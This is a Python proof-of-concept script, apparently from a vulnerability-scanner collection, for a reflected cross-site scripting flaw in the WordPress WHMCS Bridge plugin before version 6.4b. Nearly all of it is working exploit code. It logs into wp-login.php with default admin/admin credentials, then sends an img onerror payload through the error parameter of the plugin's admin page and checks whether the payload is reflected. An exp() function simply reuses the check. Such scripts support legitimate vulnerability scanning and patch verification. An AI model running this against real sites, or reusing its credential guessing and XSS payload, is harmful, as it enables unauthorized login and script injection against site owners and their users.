import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''WHMCS Bridge < 6.4b - Reflected Cross-Site Scripting (XSS)''',
        "description": '''The plugin does not sanitise and escape the error parameter before outputting it back in admin dashboard, leading to a Reflected Cross-Site Scripting''',
        "severity": "medium",
        "references": [
            "https://wpscan.com/vulnerability/4aae2dd9-8d51-4633-91bc-ddb53ca3471c"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["wordpress", "wp-plugin", "authenticated", "whmcs", "xss"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    username = "admin"
    password = "admin"
    try:
        url = format_url(url)

        s = requests.Session()

        path = """/wp-login.php"""
        method = "POST"
        data = """log={username}&pwd={password}&wp-submit=Log+In&testcookie=1""".format(username=username, password=password)
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': 'wordpress_test_cookie=WP%20Cookie%20check'}
        resp0 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/wp-admin/options-general.php?page=cc-ce-bridge-cp&error=%3Cimg%20src%20onerror=alert(document.domain)%3E"""
        method = "GET"
        data = """"""
        headers = {}
        resp1 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""<strong><img src onerror=alert(document.domain)></strong>""" in resp1.text) and ("""text/html""" in str(resp1.headers)) and (resp1.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url